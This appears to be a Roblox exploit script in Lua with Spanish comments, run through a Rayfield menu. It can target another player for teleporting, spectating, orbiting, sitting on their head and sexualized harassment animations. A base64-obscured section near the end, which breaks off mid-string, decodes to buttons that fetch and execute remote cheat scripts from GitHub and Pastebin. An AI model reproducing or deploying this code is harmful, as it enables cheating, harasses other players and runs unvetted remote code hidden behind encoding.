    local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
    if not humanoid or not root or not targetRoot then return end

    -- Animación Cari
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. cariAnimId
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    track.TimePosition = cariAnimTime
    track:AdjustSpeed(0)

    humanoid.AutoRotate = false
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    SetNoCollision(char, true)

    -- Ciclo de movimiento hacia adelante y atrás
    cariConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
        if not targetRoot.Parent then return end

        -- Ajustar distancia
        cariCurrentDistance = cariCurrentDistance + (cariSpeed * cariDirection * game:GetService("RunService").Heartbeat:Wait())

        -- Cambiar dirección si se alcanza la distancia máxima o mínima
        if cariCurrentDistance >= cariTargetDistance then
            cariDirection = -1
        elseif cariCurrentDistance <= 1.2 then
            cariDirection = 1
        end

        -- Posicionar al jugador detrás del objetivo y mirando hacia él
        local offsetPosition = targetRoot.Position - targetRoot.CFrame.LookVector * cariCurrentDistance + Vector3.new(0, 0.23, 0)
        root.CFrame = CFrame.lookAt(offsetPosition, targetRoot.Position)
    end)
end

-- Función para detener el Cari
local function StopCari()
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:FindFirstChild("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")

    if cariConnection then
        cariConnection:Disconnect()
        cariConnection = nil
    end

    if humanoid then
        humanoid.AutoRotate = true
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        for _, track in humanoid:GetPlayingAnimationTracks() do
            if tostring(track.Animation.AnimationId):find(tostring(cariAnimId)) then
                track:Stop()
            end
        end
    end

    if char then
        SetNoCollision(char, false)
    end
end


-- Función para encontrar jugador por nombre parcial o DisplayName
local function findPlayerByPartialName(name)
    name = name:lower()
    for _, player in ipairs(game.Players:GetPlayers()) do
        local usernameMatch = player.Name:lower():sub(1, #name) == name
        local displaynameMatch = player.DisplayName:lower():sub(1, #name) == name
        if usernameMatch or displaynameMatch then
            return player
        end
    end
end



-- Función para controlar la colisión
local function SetNoCollision(char, state)
    if state then
        -- Guardar estado original
        savedCollisions[char] = {}
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                savedCollisions[char][part] = part.CanCollide
                part.CanCollide = false
            end
        end
    else
        -- Restaurar el estado original
        if savedCollisions[char] then
            for part, original in pairs(savedCollisions[char]) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = original
                end
            end
            savedCollisions[char] = nil
        end
    end
end

-- Función para ejecutar el Pata
local function PlayPata(target)
    if not target or not target.Character then return end
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    local root = char:WaitForChild("HumanoidRootPart")
    local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
    if not humanoid or not root or not targetRoot then return end

    -- Animación Pata
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. pataAnimId
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    track.TimePosition = pataAnimTime
    track:AdjustSpeed(0)

    humanoid.AutoRotate = false
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    SetNoCollision(char, true)

    -- Ciclo de movimiento hacia adelante y atrás
    pataConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
        if not targetRoot.Parent then return end

        -- Ajustar distancia
        pataCurrentDistance = pataCurrentDistance + (pataSpeed * pataDirection * game:GetService("RunService").Heartbeat:Wait())

        -- Cambiar dirección si se alcanza la distancia máxima o mínima
        if pataCurrentDistance >= pataTargetDistance then
            pataDirection = -1
        elseif pataCurrentDistance <= 2.7 then
            pataDirection = 1
        end

        -- Posicionar al jugador
        local offsetPosition = targetRoot.Position + targetRoot.CFrame.LookVector * pataCurrentDistance + Vector3.new(0, 0.23, 0)
        root.CFrame = CFrame.lookAt(offsetPosition, targetRoot.Position)
    end)
end

-- Función para detener el Pata
local function StopPata()
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:FindFirstChild("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")

    if pataConnection then
        pataConnection:Disconnect()
        pataConnection = nil
    end

    if humanoid then
        humanoid.AutoRotate = true
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        for _, track in humanoid:GetPlayingAnimationTracks() do
            if tostring(track.Animation.AnimationId):find(tostring(pataAnimId)) then
                track:Stop()
            end
        end
    end

    if char then
        SetNoCollision(char, false)
    end
end


-- Función para controlar la colisión
local function SetNoCollision(char, state)
    if state then
        -- Guardar estado original
        savedCollisions[char] = {}
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                savedCollisions[char][part] = part.CanCollide
                part.CanCollide = false
            end
        end
    else
        -- Restaurar el estado original
        if savedCollisions[char] then
            for part, original in pairs(savedCollisions[char]) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = original
                end
            end
            savedCollisions[char] = nil
        end
    end
end
-- Función para ejecutar el Doggy
local function PlayDoggy(target)
    if not target or not target.Character then return end
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    local root = char:WaitForChild("HumanoidRootPart")
    local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
    if not humanoid or not root or not targetRoot then return end

    -- Animación Doggy
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. doggyAnimId
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    track.TimePosition = doggyAnimTime
    track:AdjustSpeed(0)

    humanoid.AutoRotate = false
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    SetNoCollision(char, true)

    -- Ciclo de movimiento hacia adelante y atrás
    doggyConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
        if not targetRoot.Parent then return end

        -- Ajustar distancia
        doggyCurrentDistance = doggyCurrentDistance + (doggySpeed * doggyDirection * game:GetService("RunService").Heartbeat:Wait())

        -- Cambiar dirección si se alcanza la distancia máxima o mínima
        if doggyCurrentDistance >= doggyTargetDistance then
            doggyDirection = -1
        elseif doggyCurrentDistance <= 2.7 then
            doggyDirection = 1
        end

        -- Posicionar al jugador
        local offsetPosition = targetRoot.Position + targetRoot.CFrame.LookVector * doggyCurrentDistance + Vector3.new(0, 0.23, 0)
        root.CFrame = CFrame.lookAt(offsetPosition, targetRoot.Position)
    end)
end

-- Función para detener el Doggy
local function StopDoggy()
    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:FindFirstChild("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")

    if doggyConnection then
        doggyConnection:Disconnect()
        doggyConnection = nil
    end

    if humanoid then
        humanoid.AutoRotate = true
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        for _, track in humanoid:GetPlayingAnimationTracks() do
            if tostring(track.Animation.AnimationId):find(tostring(doggyAnimId)) then
                track:Stop()
            end
        end
    end

    if char then
        SetNoCollision(char, false)
    end
end

-- Input de nombre de jugador
JugadoresTab:CreateInput({
    Name = "Nombre del Jugador",
    PlaceholderText = "Ej. juan, maria...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        local player = findPlayerByPartialName(text)
        if player then
            selectedPlayer = player
            Rayfield:Notify({
                Title = "Jugador Seleccionado",
                Content = player.Name .. " ha sido seleccionado.",
                Duration = 3,
                Image = 4483362458
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "No se encontró el jugador.",
                Duration = 3,
                Image = 4483362458
            })
        end
    end
})



local espectando = false
local cameraSubjectBackup

JugadoresTab:CreateToggle({
    Name = "Espectar",
    CurrentValue = false,
    Callback = function(Value)
        local camera = workspace.CurrentCamera
        local localPlayer = game.Players.LocalPlayer

        if Value then
            if selectedPlayer and selectedPlayer.Character then
                cameraSubjectBackup = camera.CameraSubject
                camera.CameraSubject = selectedPlayer.Character:FindFirstChildWhichIsA("Humanoid")
                espectando = true
            end
        else
            if localPlayer and localPlayer.Character then
                camera.CameraSubject = localPlayer.Character:FindFirstChildWhichIsA("Humanoid")
                espectando = false

            end
        end
    end
})





-- Teleportarse
JugadoresTab:CreateButton({
    Name = "Teleportarse",
    Callback = function()
        if selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPos = selectedPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character:MoveTo(targetPos)
        end
    end
})



-- Función para guardar y restaurar colisiones
local function SaveCollisions(char)
    savedCollisions[char] = {}
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            savedCollisions[char][part] = part.CanCollide
        end
    end
end

local function RestoreCollisions(char)
    if savedCollisions[char] then
        for part, original in pairs(savedCollisions[char]) do
            if part and part:IsA("BasePart") then
                part.CanCollide = original
            end
        end
        savedCollisions[char] = nil
    end
end

-- Sliders para órbita (ya existentes)
JugadoresTab:CreateSlider({
    Name = "Velocidad de Órbita",
    Range = {1, 200},
    Increment = 1,
    Suffix = "vel",
    CurrentValue = orbitSpeed,
    Callback = function(value)
        orbitSpeed = value
    end
})

JugadoresTab:CreateSlider({
    Name = "Distancia de Órbita",
    Range = {1, 40},
    Increment = 1,
    Suffix = "studs",
    CurrentValue = orbitDistance,
    Callback = function(value)
        orbitDistance = value
    end
})

-- Toggle para activar/desactivar órbita (ya existente)
JugadoresTab:CreateToggle({
    Name = "Órbita (girar alrededor del jugador)",
    CurrentValue = false,
    Callback = function(value)
        orbitEnabled = value
        if orbitConnection then
            orbitConnection:Disconnect()
            orbitConnection = nil
        end

        if orbitEnabled and selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetHRP = selectedPlayer.Character.HumanoidRootPart
            local localChar = game.Players.LocalPlayer.Character
            local angle = 0

            -- Guardar colisiones antes de activar la órbita
            SaveCollisions(localChar)
            
            orbitConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
                if localChar and localChar:FindFirstChild("HumanoidRootPart") then
                    angle = angle + orbitSpeed * dt
                    local offset = Vector3.new(math.cos(angle) * orbitDistance, 0, math.sin(angle) * orbitDistance)
                    local newPos = targetHRP.Position + offset
                    local hrp = localChar.HumanoidRootPart
                    hrp.CFrame = CFrame.new(newPos, targetHRP.Position)
                end
            end)

            -- Desactivar colisiones para la órbita
            for _, part in pairs(localChar:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end


        elseif not orbitEnabled then
            local localChar = game.Players.LocalPlayer.Character
            if localChar and localChar:FindFirstChild("HumanoidRootPart") then
                local safePos = localChar.HumanoidRootPart.Position + Vector3.new(0, 3, 0)
                localChar.HumanoidRootPart.CFrame = CFrame.new(safePos)

                -- Restaurar las colisiones originales
                RestoreCollisions(localChar)
            end


        end
    end
})







local sitToggle = false
local sitConnection
local isSitting = false

JugadoresTab:CreateToggle({
    Name = "Sentarse en la cabesa",
    Default = false,
    Callback = function(state)
        local localChar = game.Players.LocalPlayer.Character
        local humanoid = localChar and localChar:FindFirstChildOfClass("Humanoid")

        sitToggle = state

        if sitToggle and selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("Head") and humanoid then
            local head = selectedPlayer.Character.Head

            humanoid.Sit = true
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            humanoid.JumpHeight = 0

            local voddyPosition = head.Position + Vector3.new(0, 1, 0)
            localChar.HumanoidRootPart.CFrame = CFrame.new(voddyPosition)

            localChar.HumanoidRootPart.Anchored = true
            wait(0.01)
            localChar.HumanoidRootPart.Anchored = false

            sitConnection = game:GetService("RunService").Heartbeat:Connect(function()
                if selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("Head") then
                    local headPos = selectedPlayer.Character.Head.Position
                    localChar.HumanoidRootPart.CFrame = CFrame.new(headPos + Vector3.new(0, 1, 0))
                end
            end)

            isSitting = true
        elseif not sitToggle and humanoid then
            if sitConnection then
                sitConnection:Disconnect()
                sitConnection = nil
            end

            local originalPosition = localChar.HumanoidRootPart.Position
            localChar.HumanoidRootPart.Anchored = true
            wait(0.01)
            localChar.HumanoidRootPart.Anchored = false
            localChar.HumanoidRootPart.CFrame = CFrame.new(originalPosition)

            humanoid.Sit = false
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
            humanoid.JumpHeight = 7.2

            isSitting = false
        end
    end
})










-- Toggle para activar/desactivar Doggy
JugadoresTab:CreateToggle({
    Name = "Movimiento de boca",
    CurrentValue = false,
    Callback = function(value)
        doggyEnabled = value

        if doggyEnabled and selectedPlayer then
            PlayDoggy(selectedPlayer)
        else
            StopDoggy()

            -- Hacer que el jugador salte al desactivar
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            if humanoid then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
})


-- Slider para ajustar la velocidad del movimiento Doggy
JugadoresTab:CreateSlider({
    Name = "Velocidad",
    Range = {1, 15}, -- Rango de velocidad, ajustable según tus necesidades
    Increment = 0.1,
    Suffix = "vel",
    CurrentValue = doggySpeed,
    Callback = function(value)
        doggySpeed = value
        if doggyEnabled and selectedPlayer then
            -- Reiniciar el movimiento de Doggy para aplicar la nueva velocidad
            StopDoggy()
            PlayDoggy(selectedPlayer)
        end
    end
})



-- Toggle para activar/desactivar Pata
JugadoresTab:CreateToggle({
    Name = "Movimiento de pata",
    CurrentValue = false,
    Callback = function(value)
        pataEnabled = value

        if pataEnabled and selectedPlayer then
            PlayPata(selectedPlayer)
        else
            StopPata()

            -- Hacer que el jugador salte al desactivar
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            if humanoid then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
})


-- Slider para ajustar la velocidad del movimiento Pata
JugadoresTab:CreateSlider({
    Name = "Velocidad",
    Range = {1, 15}, -- Rango de velocidad, ajustable según tus necesidades
    Increment = 0.1,
    Suffix = "vel",
    CurrentValue = pataSpeed,
    Callback = function(value)
        pataSpeed = value
        if pataEnabled and selectedPlayer then
            -- Reiniciar el movimiento de Pata para aplicar la nueva velocidad
            StopPata()
            PlayPata(selectedPlayer)
        end
    end
})

-- Toggle para activar/desactivar Cari
JugadoresTab:CreateToggle({
    Name = "Dar Cariño",
    CurrentValue = false,
    Callback = function(value)
        cariEnabled = value

        if cariEnabled and selectedPlayer then
            PlayCari(selectedPlayer)
        else
            StopCari()

            -- Hacer que el jugador salte al desactivar
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            if humanoid then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
})

-- Slider para ajustar la velocidad del movimiento Cari
JugadoresTab:CreateSlider({
    Name = "Velocidad",
    Range = {1, 20}, -- Rango de velocidad, ajustable según tus necesidades
    Increment = 0.1,
    Suffix = "vel",
    CurrentValue = cariSpeed,
    Callback = function(value)
        cariSpeed = value
        if cariEnabled and selectedPlayer then
            -- Reiniciar el movimiento de Cari para aplicar la nueva velocidad
            StopCari()
            PlayCari(selectedPlayer)
        end
    end
})


-- Toggle para activar/desactivar Wata
JugadoresTab:CreateToggle({
    Name = "Dar Wata",
    CurrentValue = false,
    Callback = function(value)
        wataEnabled = value

        if wataEnabled and selectedPlayer then
            PlayWata(selectedPlayer)
        else
            StopWata()

            -- Hacer que el jugador salte al desactivar
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            if humanoid then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
})

-- Slider para ajustar la velocidad del movimiento Wata
JugadoresTab:CreateSlider({
    Name = "Velocidad",
    Range = {1, 20}, -- Rango de velocidad, ajustable según tus necesidades
    Increment = 0.1,
    Suffix = "vel",
    CurrentValue = wataSpeed,
    Callback = function(value)
        wataSpeed = value
        if wataEnabled and selectedPlayer then
            -- Reiniciar el movimiento de Wata para aplicar la nueva velocidad
            StopWata()
            PlayWata(selectedPlayer)
        end
    end
})



































----Scripts
_G.Window = Window



-- Función para decodificar Base64
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function base64decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

-- Aquí va el script codificado en base64
local encoded = [[
LS0tU2NyaXB0cyBwcmUgaGVjaG9zCgpUUFRhYiA9IF9HLldpbmRvdzpDcmVhdGVUYWIoIlNjcmlwdHMiLCBuaWwpIC0tIFRpdGxlLCBJbWFnZQoKQnV0dG9uMSA9IFRQVGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiSW5maW5pdGUgWWllbGQiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9FZGdlSVkvaW5maW5pdGV5aWVsZC9tYXN0ZXIvc291cmNlJykpKCkKCiAgIGVuZCwKfSkKIEJ1dHRvbjIgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkRleCIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3p6ZXJleHgvRGV4L3JlZnMvaGVhZHMvbWFzdGVyL21haW4ubHVhIikpKCkKICAgZW5kLAp9KQoKIEJ1dHRvbjIgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkZlIEludmljaWJsZSBHIHBhcmEgYWN0aXZhciIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzNSbmQ5ckhmJykpKCkKICAgZW5kLAp9KQoKCiBCdXR0b24zID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJGTGluZyhLYXdhaWkgb3ApIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCnBjYWxsKGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9oZWxsb2hlbGxvaGVsbDAxMjMyMS9LQVdBSUktRlJFQUtZLUZMSU5HL21haW4va2F3YWlpX2ZyZWFreV9mbGluZy5sdWEiLHRydWUpKSgpCmVuZCkKICAgZW5kLAp9KQoKCiBCdXR0b24zID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJBRkVNIChBbmltYWNpb25lcyBSMTUpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3lhcmhtLm1oaS5pbS9zY3I/Y2hhbm5lbD1hZmVtIiwgZmFsc2UpKSgpCiAgIGVuZCwKfSkKCiBCdXR0b24zID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJSZW1vdGUgU3B5IChPY3RvIHNweSkiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9JbmZlcm51c1NjcmlwdHMvT2N0by1TcHkvcmVmcy9oZWFkcy9tYWluL01haW4ubHVhIiwgdHJ1ZSkpKCkKICAgZW5kLAp9KQoKIEJ1dHRvbjQgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkZseSB1bml2ZXJzYWwiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9kenJHbUJidyIpKSgpCiAgIGVuZCwKfSkKCiBCdXR0b241ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiVGVjbGFkbyAoTW92aWwpIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlZFplblhZWi80ZDgwYmZkNzBlZTI3MDAwNjYwZTRiZmE3NTA5YzY2Ny9yYXcvZGE5MDNjNTcwMjQ5YWIzYzBjMWE3NGYzNDY3MjYwOTcyYzNkODdlNi9LZXlCb2FyZCUyNTIwRnJvbSUyNTIwT2hpbyUyNTIwRnIlMjUyMEZyIikpKCkKICAgIGVuZCwKIH0pCiAKCiBCdXR0b241ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJHaG9zdEh1YiIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dob3N0UGxheWVyMzUyL1Rlc3Q0L21haW4vR2hvc3RIdWInKSkoKQogICBlbmQsCn0pCgogQnV0dG9uNiA9IFRQVGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAidmVub3ggKE5lY2VzaXRhIGtleSkiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92ZW5veGNjL3Zlbm94VjEvbWFpbi9tYWluLmx1YScpKSgpCiAgIGVuZCwKfSkKCiBCdXR0b242ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJMYXRpbiBodWIoTXVjaGFzIGNvc2FzIG5vIGZ1bmNpb25hbikiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9ZWVF5RXZabScpKSgpCiAgIGVuZCwKfSkKCkJ1dHRvbjYgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkVtb3RlcyBSMTUiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9lQ3BpcENUSCIpKSgpCiAgIGVuZCwKfSkKCiBCdXR0b242ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJjMDBsa2lkZCBHdWkgKHNvbG8gbG8gdmVzIHR1KSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXdzY3JpcHRzLm5ldC9yYXcvVW5pdmVyc2FsLVNjcmlwdC1rMDBwa2lkNjY2MC1ndWktdjgtMTY5ODciKSkoKQogICBlbmQsCn0pCgoKIEJ1dHRvbjYgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlRBTEVOVExFU1MgKEF1dG8gcGlhbm8pIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCnBjYWxsKGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9oZWxsb2hlbGxvaGVsbDAxMjMyMS9UQUxFTlRMRVNTL21haW4vVEFMRU5UTEVTUyIsIHRydWUpKSgpCmVuZCkKICAgZW5kLAp9KQoKCiBCdXR0b242ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJIaXRCb3ggRXhwYW5kZXIgR3VpIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVmNzay9Sb2Jsb3hTY3JpcHRzL21haW4vSGl0Ym94RXhwYW5kZXIubHVhIikpKCkKICAgZW5kLAp9KQoKQnV0dG9uNiA9IFRQVGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiV0lTTCBodWIiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS93aXNsODg0L3dpc2wtaS1Vbml2ZXJzYWwtUHJvamVjdDEvcmVmcy9oZWFkcy9tYWluL1dpc2wnaSUyMFVuaXZlcnNhbCUyMFByb2plY3QlMjBuZXclMjBVSS5sdWEiLCB0cnVlKSkoKQogICBlbmQsCn0pCgoKIEJ1dHRvbjMgPSBUUFRhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIkJsYWNrIGhvbGUoS2F3YWlpIG9wKSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpwY2FsbChmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaGVsbG9oZWxsb2hlbGwwMTIzMjEvS0FXQUlJLUFVUkEvbWFpbi9rYXdhaWlfYXVyYS5sdWEiLCB0cnVlKSkoKQplbmQpCiAgIGVuZCwKfSkKCgogQnV0dG9uNiA9IFRQVGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiQWxxdWltaWEgaHViIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvSEZ4dXhzOVUiKSkoKQogICBlbmQsCn0pCgogQnV0dG9uNiA9IFRQVGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiU2hhZGVycyBwc2hhZGUiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYW5kb21zdHJpbmcwL3BzaGFkZS11bHRpbWF0ZS9yZWZzL2hlYWRzL21haW4vc3JjL2NkLmx1YScpKSgpCiAgIGVuZCwKfSkKCgpCdXR0b242ID0gVFBUYWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJTdWJpciBGUFMiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy84WVoyY2M2ViIpKSgpCiAgIGVuZCwKfSkKCgoKCgoKCgoKCgoKCi0tLVNjcmlwdHMgZGUganVlZ29zLS0tCgpKdWVnb3N0YWI9IF9HLldpbmRvdzpDcmVhdGVUYWIoIkp1ZWdvcyIsIG5pbCkgLS0gVGl0bGUsIEltYWdlCgpib3Rvbj0gSnVlZ29zdGFiOkNyZWF0ZUJ1dHRvbih7CiAgIE5hbWUgPSAiRHJlc3MgdG8gaW1wcmVzIiwKICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCnBjYWxsKGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9oZWxsb2hlbGxvaGVsbDAxMjMyMS9EVEktR1VJLVYyL21haW4vZHRpX2d1aV92Mi5sdWEiLHRydWUpKSgpCmVuZCkKICAgZW5kLAp9KQoKIGJvdG9uPSBKdWVnb3N0YWI6Q3JlYXRlQnV0dG9uKHsKICAgTmFtZSA9ICJCbG94IEZ1aXQgU3VwZXIgT1AiLAogICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS80bHBhY2EtcGluL0FyY2VuZXkvcmVmcy9oZWFkcy9tYWluL21haW4ubHVhdSIpKSgpCgogICBlbmQsCn0pCgogYm90b249IEp1ZWdvc3RhYjpDcmVhdGVCdXR0b24oewogICBOYW1lID0gIlRSUChubyB1bml2ZXJzYWwgcHVkZSBvY2FjaW9uYXIgbGFnKSIsCiAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQpwY2FsbChmdW5jdGlvbigpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3